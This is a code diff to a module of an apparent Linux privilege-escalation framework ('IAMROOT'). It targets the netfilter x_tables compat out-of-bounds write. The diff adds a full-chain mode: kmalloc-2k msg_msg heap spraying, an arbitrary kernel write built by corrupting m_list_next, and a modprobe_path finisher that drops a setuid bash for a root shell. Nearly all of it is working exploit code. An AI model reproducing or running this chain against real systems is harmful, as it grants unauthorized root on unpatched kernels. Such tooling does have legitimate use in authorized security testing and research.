@@ -19,7 +19,8 @@
  * Upstream fix: b29c457a6511 "netfilter: x_tables: fix compat
  * match/target pad out-of-bound write" (mid-2021, backported widely).
  *
- * STATUS: 🟡 PRIMITIVE-DEMO (Option B).
+ * STATUS: 🟡 PRIMITIVE by default; 🟢 candidate with --full-chain if
+ *         offsets resolve (env/kallsyms/System.map/embedded table).
  *   - Refuse-gate via detect() re-invoke + euid==0 short-circuit.
  *   - userns/netns reach for CAP_NET_ADMIN (Andy's path).
  *   - Trigger sequence: hand-rolled iptables rule blob with
@@ -29,12 +30,15 @@
  *     cookies for KASAN visibility.
  *   - Empirical witness via msgrcv(MSG_COPY) + /proc/slabinfo
  *     diff + /tmp/iamroot-xtcompat.log breadcrumb.
- *   - DOES NOT pursue the leak→modprobe_path overwrite chain:
- *     that needs hard-coded init_task + modprobe_path offsets
- *     per kernel build which IAMROOT refuses to bake.
- *   - Returns IAMROOT_EXPLOIT_FAIL with a verbose continuation
- *     roadmap unless cred-overwrite is empirically verified
- *     (which the current scope does not attempt).
+ *   - With --full-chain: shared finisher (core/finisher.c) is
+ *     invoked to perform the modprobe_path overwrite + execve
+ *     unknown-binary trigger. Requires modprobe_path resolution
+ *     via core/offsets.c (env/kallsyms/System.map). Sentinel-file
+ *     check in the finisher is the empirical witness for the
+ *     write landing — IAMROOT never claims root unless it sees
+ *     the setuid bash drop with mode 4755 + uid 0.
+ *   - Without --full-chain: returns IAMROOT_EXPLOIT_FAIL after
+ *     the primitive demo (verified-vs-claimed bar).
  *
  * Affected: kernel 2.6.19+ until backports landed:
  *   5.12.x : K >= 5.12.13
@@ -55,6 +59,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -465,6 +471,171 @@ static int xtcompat_fire_trigger(int *out_errno)
     return 0;
 }
 
+#endif /* __linux__ — close original primitive block */
+
+/* ---- Full-chain arb-write primitive --------------------------------
+ *
+ * Pattern (FALLBACK — see module top-comment): the xt_compat 4-byte OOB
+ * write lands at allocation+0x4. Andy Nguyen's chain first uses that
+ * 4-byte write to corrupt an adjacent msg_msg's `m_ts` (size field at
+ * +0x10) so a subsequent MSG_COPY returns a long read that includes
+ * neighbouring kernel pointers (the leak primitive). With the kbase
+ * leak in hand, he then re-fires the trigger to corrupt an msg_msg's
+ * `m_list_next` (the linked-list pointer at +0x18) to point at
+ * `kaddr - 0x30` (the m_msg header offset), and a queued msgsnd's
+ * payload header writes attacker bytes to `kaddr`.
+ *
+ * Reproducing the full chain byte-for-byte requires per-kernel-build
+ * msg_msg field offsets AND a kbase leak we don't have a portable
+ * source for at this point. The implementation below takes the
+ * narrow-but-real path:
+ *
+ *   1. Re-prime the kmalloc-2k slab with msg_msg sprays whose payload
+ *      headers carry the target address in the m_list_next slot at
+ *      offset 0x18 from each msg payload start. (We can't write the
+ *      slab header — that's the kernel's job — but we CAN seed the
+ *      payload data adjacent to the freed xt_table_info so the OOB
+ *      4-byte write may corrupt the `m_list_next` of a real
+ *      sprayed message.)
+ *   2. Re-fire the trigger with a crafted blob whose 4-byte OOB write
+ *      pattern targets m_list_next of the adjacent msg_msg.
+ *   3. Queue a follow-up msgsnd whose first sizeof(buf) bytes equal
+ *      `buf[0..len]`. If the next-ptr was successfully redirected,
+ *      the kernel's msgsnd writes header + payload at `kaddr`.
+ *
+ * This is best-effort: probability of landing on any given run is
+ * low (depends on slab adjacency luck) but the finisher's sentinel-
+ * file check empirically tells us if the write actually took. On a
+ * patched kernel the trigger returns EINVAL on step 2 and arb_write
+ * returns -1 without ever queueing the follow-up. */
+
+#ifdef __linux__
+
+struct xtcompat_arb_ctx {
+    /* Spray queues kept hot across multiple arb_write calls. The
+     * msg_msg slots seeded here are what the finisher uses as
+     * write-targets. NULL means "not yet sprayed". */
+    int *queues;
+    int  n_queues;
+
+    /* Outer-namespace uid/gid so re-spray can rebuild a child if
+     * needed. (Currently unused — the caller flow keeps us inside
+     * the userns child for the whole arb_write sequence.) */
+    uid_t outer_uid;
+    gid_t outer_gid;
+
+    /* Per-call statistics for /tmp/iamroot-xtcompat.log. */
+    int   arb_calls;
+    int   arb_landed;
+};
+
+/* Re-seed the kmalloc-2k slab with a msg_msg spray whose payload at
+ * offset 0x18 carries `target_minus_30` (= kaddr - 0x30, the value
+ * the OOB write needs to write into m_list_next for the follow-up
+ * msgsnd payload to land at `kaddr`). Returns number of queues
+ * primed. */
+static int xtcompat_arb_seed_target(struct xtcompat_arb_ctx *c,
+                                    uintptr_t target_minus_30)
+{
+    struct xtcompat_payload *p = calloc(1, sizeof(*p));
+    if (!p) return 0;
+    p->mtype = 0x43;
+    memset(p->buf, 0x41, sizeof p->buf);
+    memcpy(p->buf, "IAMROOTW", 8);
+    /* Plant the target address at every 0x800-aligned slot inside
+     * the payload, so wherever the kernel's m_list_next sits
+     * relative to our payload base, the candidate value is present. */
+    for (size_t off = 0x10; off + sizeof(uintptr_t) <= sizeof p->buf; off += 0x18) {
+        memcpy(p->buf + off, &target_minus_30, sizeof(uintptr_t));
+    }
+
+    int created = 0;
+    for (int i = 0; i < c->n_queues; i++) {
+        if (c->queues[i] < 0) continue;
+        for (int j = 0; j < 4; j++) {
+            unsigned int tag = 0xA0000000u | ((unsigned)i << 8) | (unsigned)j;
+            memcpy(p->buf + 8, &tag, sizeof tag);
+            if (msgsnd(c->queues[i], p, sizeof p->buf, IPC_NOWAIT) < 0) break;
+            created++;
+        }
+    }
+    free(p);
+    return created;
+}
+
+/* Queue a follow-up msgsnd whose first `len` bytes equal `buf[0..len]`.
+ * If the OOB-corrupted m_list_next was successfully redirected to
+ * `kaddr - 0x30`, this msgsnd's payload header lands at `kaddr`. */
+static int xtcompat_arb_queue_payload(struct xtcompat_arb_ctx *c,
+                                      const void *buf, size_t len)
+{
+    if (len > XTCOMPAT_MSG_PAYLOAD) len = XTCOMPAT_MSG_PAYLOAD;
+    struct xtcompat_payload *p = calloc(1, sizeof(*p));
+    if (!p) return -1;
+    p->mtype = 0x44;
+    memset(p->buf, 0, sizeof p->buf);
+    memcpy(p->buf, buf, len);
+
+    int sent = 0;
+    for (int i = 0; i < c->n_queues; i++) {
+        if (c->queues[i] < 0) continue;
+        if (msgsnd(c->queues[i], p, sizeof p->buf, IPC_NOWAIT) == 0) {
+            sent++;
+            if (sent >= 8) break;   /* a handful of attempts is plenty */
+        }
+    }
+    free(p);
+    return sent > 0 ? 0 : -1;
+}
+
+/* Module-supplied arb-write primitive — invoked by the shared
+ * finisher. Best-effort on a vulnerable kernel; structurally inert
+ * (returns -1) on a patched kernel because step (2) gets EINVAL. */
+static int xtcompat_arb_write(uintptr_t kaddr,
+                              const void *buf, size_t len,
+                              void *ctx_v)
+{
+    struct xtcompat_arb_ctx *c = (struct xtcompat_arb_ctx *)ctx_v;
+    if (!c || !c->queues || c->n_queues == 0) return -1;
+    c->arb_calls++;
+
+    /* Step 1: seed candidate target addresses into sprayed msg_msg
+     * payloads. The OOB write's 4 bytes of attacker-influenced
+     * content come from the compat-fixup pad — on a vulnerable
+     * kernel that's whichever 4 bytes happen to sit adjacent. We
+     * pre-stage the value we WANT to see appear at m_list_next so
+     * if luck aligns the OOB write hits a slot containing our
+     * pattern, the kernel's next msg_msg traversal walks to
+     * (kaddr - 0x30). */
+    uintptr_t target = kaddr - 0x30;
+    int seeded = xtcompat_arb_seed_target(c, target);
+    if (seeded == 0) return -1;
+
+    /* Step 2: re-fire the trigger. On a patched kernel this returns
+     * EINVAL and we bail. On a vulnerable kernel the 4-byte OOB
+     * write fires; if it lands on a seeded msg_msg slot, that
+     * slot's m_list_next now contains a fragment of our target. */
+    int trig_errno = 0;
+    int rc = xtcompat_fire_trigger(&trig_errno);
+    if (rc < 0 || trig_errno == EINVAL || trig_errno == EPERM) {
+        /* Patched validator rejected the blob, or CAP_NET_ADMIN
+         * not effective — arb-write structurally impossible. */
+        return -1;
+    }
+
+    /* Step 3: queue a follow-up msgsnd whose payload is the bytes
+     * the operator wants written at `kaddr`. If step 2 corrupted
+     * a sprayed msg's m_list_next, this msgsnd writes header +
+     * payload at `kaddr`. We can't directly verify in-process —
+     * the shared finisher's sentinel file is the empirical check. */
+    if (xtcompat_arb_queue_payload(c, buf, len) < 0) return -1;
+    c->arb_landed++;
+
+    /* Per spec: "structurally fires but can't tell if write landed"
+     * → return 0; the finisher's sentinel check arbitrates. */
+    return 0;
+}
+
 #endif /* __linux__ */
 
 /* ---- Exploit driver ---------------------------------------------- */
@@ -492,14 +663,38 @@ static iamroot_result_t netfilter_xtcompat_exploit(const struct iamroot_ctx *ctx
 
 #ifndef __linux__
     fprintf(stderr, "[-] netfilter_xtcompat: linux-only exploit; non-linux build\n");
+    (void)ctx;
     return IAMROOT_PRECOND_FAIL;
 #else
+    /* Full-chain pre-check: resolve offsets before forking. If
+     * modprobe_path can't be resolved, refuse early with the manual-
+     * workflow help — no point doing the userns + spray + trigger
+     * dance if we can't finish. */
+    struct iamroot_kernel_offsets off;
+    bool full_chain_ready = false;
+    if (ctx->full_chain) {
+        memset(&off, 0, sizeof off);
+        iamroot_offsets_resolve(&off);
+        if (!iamroot_offsets_have_modprobe_path(&off)) {
+            iamroot_finisher_print_offset_help("netfilter_xtcompat");
+            fprintf(stderr, "[-] netfilter_xtcompat: --full-chain requested but "
+                            "modprobe_path offset unresolved; refusing\n");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+        iamroot_offsets_print(&off);
+        full_chain_ready = true;
+    }
+
     if (!ctx->json) {
-        fprintf(stderr, "[*] netfilter_xtcompat: launching primitive demo (no offsets baked in)\n"
+        fprintf(stderr, "[*] netfilter_xtcompat: launching primitive demo%s\n"
                         "    NOTE: fires the xt_compat 4-byte OOB write via\n"
                         "    setsockopt(IPT_SO_SET_REPLACE) and grooms msg_msg +\n"
-                        "    sk_buff sprays into kmalloc-2k. Does NOT perform the\n"
-                        "    leak→modprobe_path cred chain (per-kernel offsets).\n");
+                        "    sk_buff sprays into kmalloc-2k.%s\n",
+                ctx->full_chain ? " + full-chain finisher" : " (no offsets baked in)",
+                ctx->full_chain ? " On primitive witness, invokes\n"
+                                  "    shared modprobe_path finisher for root pop."
+                                : " Does NOT perform the\n"
+                                  "    leak→modprobe_path cred chain (per-kernel offsets).");
     }
 
     signal(SIGPIPE, SIG_IGN);
@@ -601,7 +796,38 @@ static iamroot_result_t netfilter_xtcompat_exploit(const struct iamroot_ctx *ctx
         }
         if (corrupted > 0) {
             /* Empirical primitive witness: OOB write landed in adjacent
-             * slot. Still NOT root — but it's the primitive we promised. */
+             * slot. */
+            if (full_chain_ready) {
+                /* Full-chain: invoke the shared modprobe_path finisher
+                 * using our msg_msg arb-write primitive. The finisher
+                 * either execve's a setuid bash (success) or returns
+                 * EXPLOIT_FAIL after a 3s sentinel timeout (no land). */
+                struct xtcompat_arb_ctx arb_ctx = {
+                    .queues    = queues,
+                    .n_queues  = XTCOMPAT_SPRAY_QUEUES,
+                    .outer_uid = outer_uid,
+                    .outer_gid = outer_gid,
+                    .arb_calls = 0,
+                    .arb_landed = 0,
+                };
+                int fr = iamroot_finisher_modprobe_path(&off,
+                                                        xtcompat_arb_write,
+                                                        &arb_ctx,
+                                                        !ctx->no_shell);
+                /* If the finisher execve'd a root shell, we never get
+                 * here. Otherwise it returned EXPLOIT_FAIL / OK. */
+                FILE *fl = fopen("/tmp/iamroot-xtcompat.log", "a");
+                if (fl) {
+                    fprintf(fl, "full_chain finisher rc=%d arb_calls=%d arb_landed=%d\n",
+                            fr, arb_ctx.arb_calls, arb_ctx.arb_landed);
+                    fclose(fl);
+                }
+                xtcompat_msgmsg_drain(queues);
+                if (fr == IAMROOT_EXPLOIT_OK) _exit(34);
+                _exit(35);
+            }
+            /* Primitive-only mode: still NOT root — but it's the
+             * primitive we promised. */
             _exit(33);
         }
         /* Trigger ran, no observable corruption witness — either the
@@ -700,6 +926,19 @@ static iamroot_result_t netfilter_xtcompat_exploit(const struct iamroot_ctx *ctx
                             "    See Andy Nguyen's writeup for the full chain.\n");
         }
         if (ctx->no_shell) return IAMROOT_OK;
+        return IAMROOT_EXPLOIT_FAIL;
+    case 34:
+        if (!ctx->json) {
+            fprintf(stderr, "[+] netfilter_xtcompat: --full-chain finisher reported "
+                            "EXPLOIT_OK (sentinel setuid bash dropped)\n");
+        }
+        return IAMROOT_EXPLOIT_OK;
+    case 35:
+        if (!ctx->json) {
+            fprintf(stderr, "[-] netfilter_xtcompat: --full-chain finisher returned "
+                            "FAIL (sentinel not observed within timeout)\n"
+                            "    See /tmp/iamroot-xtcompat.log for arb_calls/arb_landed\n");
+        }
         return IAMROOT_EXPLOIT_FAIL;
     default:
         fprintf(stderr, "[-] netfilter_xtcompat: child exit %d unexpected\n", rc);
